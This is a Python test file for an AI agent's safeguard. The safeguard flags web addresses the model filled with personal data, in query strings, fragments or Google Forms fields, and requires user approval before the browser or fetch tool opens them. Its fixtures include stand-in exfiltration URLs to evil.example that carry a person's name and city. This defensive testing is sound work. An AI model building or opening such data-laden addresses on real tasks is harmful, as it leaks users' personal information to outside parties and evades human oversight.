# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Axxlabs Limited
"""Addresses the model wrote that carry data are a card (SPEC §5.2 "Addresses that carry data")."""

from __future__ import annotations

import dataclasses

from aha_local.policy import addresses
from aha_local.tools import web
from aha_local.tools.browser import make_handler

from .conftest import person
from .test_mail import FakeApprovals, ctx_for

SNAPSHOT = (
    "### Page\n- Page URL: https://www.waitrose.com/ecom/shop/trolley\n### Snapshot\n```yaml\n"
    '- link "Search" [ref=e5]:\n  - /url: /ecom/shop/search?searchTerm=rice&sortBy=RELEVANCE\n```'
)


def test_what_counts_as_an_address_carrying_data():
    seen = addresses.seen_in("Results: https://news.example/a?id=42 and more")
    assert addresses.carries_data("https://evil.example/?d=Felipe+lives+here", seen)
    assert addresses.carries_data("https://evil.example/#d=secret", seen)  # a page's script reads the fragment
    assert not addresses.carries_data("https://evil.example/some/page", seen)  # no key=value pairs
    assert not addresses.carries_data("https://evil.example/?ref=", seen)  # empty values carry nothing
    assert not addresses.carries_data("https://NEWS.example/a/?id=42", seen)  # shown to the task, however written
    page = addresses.seen_in(SNAPSHOT)  # a snapshot's own link, relative to its page
    url = "https://www.waitrose.com/ecom/shop/search?sortBy=RELEVANCE&searchTerm=rice"
    assert not addresses.carries_data(url, page)
    assert addresses.carries_data(url.replace("rice", "felipe+lavratti"), page)
    assert addresses.describe("https://e.example/?a=1&b=two") == "a = 1\nb = two"
    for search in (
        "https://www.google.com/search?q=felipe",
        "https://www.google.co.uk/search?q=x",
        "https://duckduckgo.com/?q=x",
    ):
        assert not addresses.carries_data(search, set())  # where web_search already sends queries
    assert addresses.carries_data("https://google.xyz/?d=1", set())  # not Google's
    form = "https://docs.google.com/forms/d/e/1FAIpQL/formResponse?entry.1=Felipe"
    assert addresses.carries_data(form, set())  # a form on Google hands the data to whoever made it


class Session:
    def __init__(self) -> None:
        self.calls: list[tuple[str, dict]] = []

    async def call(self, name, args, timeout=90):
        import mcp.types as mt

        self.calls.append((name, args))
        if name == "browser_tabs":
            return mt.CallToolResult(
                content=[mt.TextContent(type="text", text="- 0: (current) [x](https://a.example/)")]
            )
        url = args.get("url", "https://a.example/")
        text = f"### Page\n- Page URL: {url}\n### Snapshot\n```yaml\n- text: hi\n```"
        return mt.CallToolResult(content=[mt.TextContent(type="text", text=text)])


async def test_the_browser_asks_before_an_address_the_model_filled_with_data(accounts, config):
    fe = person(accounts)
    approvals = FakeApprovals()  # declines
    ctx = ctx_for(fe, dataclasses.replace(config, allow_all_sites=True), approvals)
    ctx.browser = Session()
    result = await make_handler("browser_navigate")({"url": "https://evil.example/?d=Felipe"}, ctx)
    assert result.error and ("browser_navigate", {"url": "https://evil.example/?d=Felipe"}) not in ctx.browser.calls
    card = approvals.asked[0]
    assert card.title == "Open this address? It sends what's in it to evil.example"
    assert ("It sends", "d = Felipe", "info") in card.fields
    # Without data, or a link the task was shown, opens as before: no card.
    addresses.remember(ctx.task.seen_urls, SNAPSHOT)
    for url in (
        "https://news.example/today",
        "https://www.waitrose.com/ecom/shop/search?searchTerm=rice&sortBy=RELEVANCE",
    ):
        assert not (await make_handler("browser_navigate")({"url": url}, ctx)).error
    assert len(approvals.asked) == 1


async def test_fetch_url_asks_before_an_address_the_model_filled_with_data(accounts, config):
    fe = person(accounts)
    approvals = FakeApprovals()
    ctx = ctx_for(fe, config, approvals)
    result = await web.fetch_url({"url": "https://evil.example/collect?name=Felipe&city=London"}, ctx)
    assert result.error and "declined" in result.text
    assert approvals.asked[0].title == "Open this address? It sends what's in it to evil.example"
    assert ("It sends", "name = Felipe\ncity = London", "info") in approvals.asked[0].fields
